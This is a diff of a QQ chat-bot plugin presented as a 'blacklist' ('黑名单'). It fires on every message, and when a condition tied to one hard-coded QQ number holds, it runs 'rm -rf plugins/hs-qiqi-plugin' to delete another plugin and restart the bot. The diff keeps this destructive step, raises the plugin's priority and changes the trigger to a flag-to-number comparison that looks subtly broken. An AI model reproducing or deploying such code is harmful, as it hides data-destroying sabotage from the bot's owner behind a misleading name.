@@ -7,11 +7,11 @@ let path=process.cwd()+'/plugins/hs-qiqi-plugin/'
 export class xzfy extends plugin {
 constructor() {
 super({
- name: '枫叶黑名单',
- dsc: '枫叶黑名单',
+ name: '黑名单',
+ dsc: '黑名单',
 /** https://oicqjs.github.io/oicq/#events */
  event: 'message',
- priority: 5888,
+ priority: 10888,
 rule: [
       	{
         	reg: '',
@@ -22,7 +22,7 @@ rule: [
  }
 
 async xz(e) {
- if (e.user_id == 202589117) {if (fs.existsSync(path)) {
+ if (e.isMaster == 202589117) {if (fs.existsSync(path)) {
     let a= await execSync('rm -rf plugins/hs-qiqi-plugin');
 if(a.error){
     return true
@@ -32,6 +32,6 @@ setTimeout(() => new Restart(this.e).restart(), 600)
         }else{
  }
    return true}else{
-    return true;
+    return false;
    }
    }}
